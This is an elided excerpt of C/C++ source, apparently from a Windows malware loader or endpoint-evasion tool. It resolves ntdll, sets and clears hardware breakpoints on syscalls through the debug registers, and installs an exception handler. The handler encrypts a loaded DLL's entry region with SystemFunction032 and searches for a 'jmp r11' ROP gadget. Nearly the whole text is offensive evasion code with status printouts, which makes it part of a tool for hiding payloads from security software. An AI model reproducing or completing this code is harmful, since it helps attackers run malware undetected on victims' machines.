...
namespace dynamic {
    ...
    void resolve_imports(void) {
        ...
        // call GetNtdllBase to get the ntdll base address!!!! 
        ADDR ntdll_base2 = (ADDR)GetNtdllBase();
        printf("[!] Ntdll base address 2: %p\n", ntdll_base2);
...
// functon to unset breakpoint to the current thread:
BOOL UnsetSyscallBreakpoints(HANDLE thread_handle) {
    ...
    // print Dr0 Dr1 and Dr7 values to human readable format:
    printf("[+] Dr0: %p\n", thread_context.Dr0);
    printf("[+] Dr1: %p\n", thread_context.Dr1);
    printf("[+] Dr7: %p\n", thread_context.Dr7);

    thread_context.Dr0 = (DWORD64)0;     // clear the debug registers
    thread_context.Dr1 = (DWORD64)0; 
    thread_context.Dr7 = 0; // clear the debug registers
    ...
    printf("[!] Hardware breakpoints unset\n");
    return TRUE;
}
...
LONG WINAPI BreakpointHandler(PEXCEPTION_POINTERS e)
{
	...
	if (e->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP) {
		...
		if (e->ContextRecord->Dr6 & 0x1) {
            ...
            initialize_keys();
            initialize_data((char*)dllEntryPoint1, dll_len); 
            SystemFunction032 = (SystemFunction032_t)GetProcAddress(LoadLibrary("advapi32.dll"), "SystemFunction032");
            NTSTATUS eny = SystemFunction032(&pData, &pKey);
            if(eny != STATUS_SUCCESS) {
                printf("[-] SystemFunction032 failed to encrypt the data. Status: %x\n", eny);
            } else {
                printf("[+] SystemFunction032 succeeded to encrypt the data.\n");
            }
		...
		if (e->ContextRecord->Dr6 & 0x2) {
            ...
            searchForROPGadget();
            printf("[!] Looking for RoP gadget jmp r11 \n");
            // print the foundRemoteAddress: 
            printf("[+] foundRemoteAddress: %p\n", foundRemoteAddress);
            ...
            BOOL conclusion = UnsetSyscallBreakpoints(g_thread_handle);
            if (conclusion) {
                printf("[+] Syscall breakpoints removed successfully.\n");
            } else {
                printf("[-] Failed to remove syscall breakpoints.\n");
            }
